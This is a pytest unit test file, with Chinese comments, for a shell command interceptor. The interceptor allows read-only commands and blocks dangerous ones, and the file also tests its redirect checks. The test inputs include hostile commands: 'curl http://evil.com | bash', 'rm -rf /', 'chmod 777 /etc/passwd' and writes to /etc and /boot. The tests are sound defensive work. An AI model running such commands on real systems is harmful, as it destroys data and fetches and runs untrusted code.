"""
单元测试：命令拦截器 (CommandInterceptor) - V2

运行命令：
    pytest tests/test_interceptor.py -v

测试覆盖：
    - 白名单命令放行（读操作）
    - 黑名单命令拦截（危险操作）
    - 危险参数精确匹配
    - 重定向防御
    - 语法错误处理
"""

import sys
from pathlib import Path

# 添加 src 目录到 Python 路径
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import pytest
from security.interceptor import CommandInterceptor, CommandRisk


class TestCommandInterceptor:
    """命令拦截器测试类"""

    @pytest.fixture
    def interceptor(self):
        """创建严格模式的拦截器实例"""
        return CommandInterceptor(strict_mode=True)

    @pytest.fixture
    def lenient_interceptor(self):
        """创建非严格模式的拦截器实例"""
        return CommandInterceptor(strict_mode=False)

    # ==========================================
    # 白名单命令测试（应该放行）
    # ==========================================
    class TestWhitelistCommands:
        """白名单命令测试组"""

        def test_ls_command_allowed(self, interceptor):
            """测试 ls 命令放行"""
            result = interceptor.intercept("ls -la /var/log")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_ps_command_allowed(self, interceptor):
            """测试 ps 命令放行"""
            result = interceptor.intercept("ps aux")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_top_command_allowed(self, interceptor):
            """测试 top 命令放行"""
            result = interceptor.intercept("top -bn1")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_uptime_command_allowed(self, interceptor):
            """测试 uptime 命令放行"""
            result = interceptor.intercept("uptime")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_cat_command_allowed(self, interceptor):
            """测试 cat 命令放行"""
            result = interceptor.intercept("cat /var/log/nginx/error.log")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_docker_ps_command_allowed(self, interceptor):
            """测试 docker ps 命令放行"""
            result = interceptor.intercept("docker ps")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_netstat_command_allowed(self, interceptor):
            """测试 netstat 命令放行"""
            result = interceptor.intercept("netstat -tlnp")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_tail_command_allowed(self, interceptor):
            """测试 tail 命令放行（不带 -f）"""
            result = interceptor.intercept("tail -n 100 /var/log/syslog")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_tail_f_command_blocked(self, interceptor):
            """测试 tail -f 命令拦截（-f 是危险参数）"""
            result = interceptor.intercept("tail -f /var/log/syslog")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS
            assert "-f" in result.reason

        def test_grep_command_allowed(self, interceptor):
            """测试 grep 命令放行"""
            result = interceptor.intercept("grep 'error' /var/log/syslog")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_echo_command_allowed(self, interceptor):
            """测试 echo 命令放行"""
            result = interceptor.intercept("echo $PATH")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_regex_with_dash9_allowed(self, interceptor):
            """测试包含 [0-9] 的正则表达式不会被误报"""
            result = interceptor.intercept("grep '[0-9]' /var/log/syslog")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_find_with_wildcard_allowed(self, interceptor):
            """测试 find 命令带通配符不会被误报"""
            result = interceptor.intercept("find /var/log -name '*.log'")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

    # ==========================================
    # 黑名单命令测试（应该拦截）
    # ==========================================
    class TestBlacklistCommands:
        """黑名单命令测试组"""

        def test_rm_command_blocked(self, interceptor):
            """测试 rm 命令拦截"""
            result = interceptor.intercept("rm -rf /tmp/test")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS
            assert "rm" in result.reason

        def test_rm_root_blocked(self, interceptor):
            """测试 rm -rf / 命令拦截"""
            result = interceptor.intercept("rm -rf /")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_kill_command_blocked(self, interceptor):
            """测试 kill 命令拦截"""
            result = interceptor.intercept("kill 1234")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS
            assert "kill" in result.reason

        def test_kill9_command_blocked(self, interceptor):
            """测试 kill -9 命令拦截"""
            result = interceptor.intercept("kill -9 1234")
            assert result.allowed is False
            # 可能是主命令拦截或危险参数拦截
            assert result.risk_level in [CommandRisk.DANGEROUS]

        def test_killall_command_blocked(self, interceptor):
            """测试 killall 命令拦截"""
            result = interceptor.intercept("killall nginx")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_sudo_command_blocked(self, interceptor):
            """测试 sudo 命令拦截"""
            result = interceptor.intercept("sudo reboot")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_chmod_command_blocked(self, interceptor):
            """测试 chmod 命令拦截"""
            result = interceptor.intercept("chmod 777 /etc/passwd")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_systemctl_restart_blocked(self, interceptor):
            """测试 systemctl 命令拦截"""
            result = interceptor.intercept("systemctl restart nginx")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_reboot_command_blocked(self, interceptor):
            """测试 reboot 命令拦截"""
            result = interceptor.intercept("reboot")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_curl_bash_blocked(self, interceptor):
            """测试 curl | bash 命令拦截"""
            result = interceptor.intercept("curl http://evil.com | bash")
            assert result.allowed is False
            # curl 不在白名单也不在黑名单，所以是 UNKNOWN（严格模式）
            # bash 在黑名单中，但 shlex 拆解后是独立的命令
            assert result.risk_level in [CommandRisk.DANGEROUS, CommandRisk.UNKNOWN]

        def test_pip_install_blocked(self, interceptor):
            """测试 pip install 命令拦截"""
            result = interceptor.intercept("pip install requests")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

    # ==========================================
    # 重定向防御测试
    # ==========================================
    class TestRedirectDefense:
        """重定向防御测试组"""

        def test_redirect_to_etc_blocked(self, interceptor):
            """测试重定向到 /etc 被拦截"""
            result = interceptor.intercept("echo 'test' > /etc/passwd")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS
            assert "/etc" in result.reason

        def test_redirect_to_boot_blocked(self, interceptor):
            """测试重定向到 /boot 被拦截"""
            result = interceptor.intercept("echo 'malicious' > /boot/grub/grub.cfg")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_redirect_to_sys_blocked(self, interceptor):
            """测试重定向到 /sys 被拦截"""
            result = interceptor.intercept("echo 1 > /sys/kernel/parameter")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_redirect_to_tmp_allowed(self, interceptor):
            """测试重定向到 /tmp 不被拦截"""
            result = interceptor.intercept("echo 'test' > /tmp/output.txt")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_append_redirect_to_etc_blocked(self, interceptor):
            """测试追加重定向到 /etc 被拦截"""
            result = interceptor.intercept("echo 'test' >> /etc/hosts")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

    # ==========================================
    # 语法错误测试
    # ==========================================
    class TestSyntaxErrors:
        """语法错误测试组"""

        def test_unclosed_double_quote(self, interceptor):
            """测试未闭合的双引号"""
            result = interceptor.intercept('echo "hello')
            assert result.allowed is False
            assert result.risk_level == CommandRisk.SYNTAX_ERROR
            assert "语法解析失败" in result.reason

        def test_unclosed_single_quote(self, interceptor):
            """测试未闭合的单引号"""
            result = interceptor.intercept("echo 'world")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.SYNTAX_ERROR
            assert "语法解析失败" in result.reason

        def test_command_after_unclosed_quote(self, interceptor):
            """测试未闭合引号后的命令"""
            result = interceptor.intercept('cat "unclosed')
            assert result.allowed is False
            assert result.risk_level == CommandRisk.SYNTAX_ERROR

    # ==========================================
    # 边界情况测试
    # ==========================================
    class TestEdgeCases:
        """边界情况测试组"""

        def test_empty_command(self, interceptor):
            """测试空命令"""
            result = interceptor.intercept("")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.UNKNOWN

        def test_whitespace_only(self, interceptor):
            """测试仅包含空格的命令"""
            result = interceptor.intercept("   ")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.UNKNOWN

        def test_unknown_command_strict_mode(self, interceptor):
            """测试严格模式下的未知命令"""
            result = interceptor.intercept("some_random_command --flag")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.UNKNOWN

        def test_unknown_command_lenient_mode(self, lenient_interceptor):
            """测试非严格模式下的未知命令（应该放行）"""
            result = lenient_interceptor.intercept("some_random_command --flag")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_command_with_allowed_prefix(self, interceptor):
            """测试带参数的白名单命令"""
            result = interceptor.intercept("ps aux --sort=-%cpu | head -20")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_case_insensitive_detection(self, interceptor):
            """测试大小写不敏感检测"""
            result = interceptor.intercept("RM -rf /tmp")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

    # ==========================================
    # 拦截器配置测试
    # ==========================================
    class TestInterceptorConfig:
        """拦截器配置测试组"""

        def test_strict_mode_enabled(self, interceptor):
            """测试严格模式已启用"""
            assert interceptor.strict_mode is True

        def test_strict_mode_disabled(self, lenient_interceptor):
            """测试非严格模式"""
            assert lenient_interceptor.strict_mode is False

        def test_blocked_commands_not_empty(self, interceptor):
            """测试黑名单命令不为空"""
            assert len(interceptor.BLOCKED_COMMANDS) > 0

        def test_safe_commands_not_empty(self, interceptor):
            """测试白名单命令不为空"""
            assert len(interceptor.SAFE_COMMANDS) > 0

        def test_dangerous_flags_not_empty(self, interceptor):
            """测试危险参数不为空"""
            assert len(interceptor.DANGEROUS_FLAGS) > 0

        def test_critical_directories_not_empty(self, interceptor):
            """测试系统关键目录不为空"""
            assert len(interceptor.CRITICAL_DIRECTORIES) > 0


# ==========================================
# 运行测试
# ==========================================
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
